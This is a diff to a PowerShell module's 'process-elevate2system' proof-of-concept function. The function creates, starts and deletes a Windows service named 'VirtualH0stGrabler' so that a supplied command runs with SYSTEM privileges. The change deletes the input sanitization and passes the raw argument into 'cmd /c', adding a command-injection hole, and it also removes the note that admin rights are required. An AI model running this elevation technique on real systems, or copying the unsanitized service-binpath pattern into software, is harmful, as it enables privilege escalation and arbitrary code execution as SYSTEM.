@@ -263,18 +263,16 @@ Set-Alias -Name process-elevate2 -Value process-elevate2
 
 
 #POC for Windows (you must be admin!!)
+#POC for Windows
 function process-elevate2system {
     param(
-        [string]$processName
+		[string]$processName
     )
-    $sanitizedProcessName = $processName -replace '[^a-zA-Z0-9_.-]', ''
-    $createServiceCommand = "SC CREATE VirtualH0stGrabler binpath= `"" + $sanitizedProcessName + "`""
-    $startServiceCommand = "SC start VirtualH0stGrabler"
-    $deleteServiceCommand = "SC DELETE VirtualH0stGrabler"
-    powershell -command $createServiceCommand
-    powershell -command $startServiceCommand
-    Start-Sleep -Seconds 22.5
-    powershell -command $deleteServiceCommand
+    $Request =  $processName
+cmd /c SC CREATE VirtualH0stGrabler binpath= "cmd /c cmd /c $Request"
+cmd /c SC start VirtualH0stGrabler
+sleep(9.9)
+cmd /c SC DELETE VirtualH0stGrabler
 }
 Export-ModuleMember -Function process-elevate2system
 Set-Alias -Name process-elevate2system -Value process-elevate2system
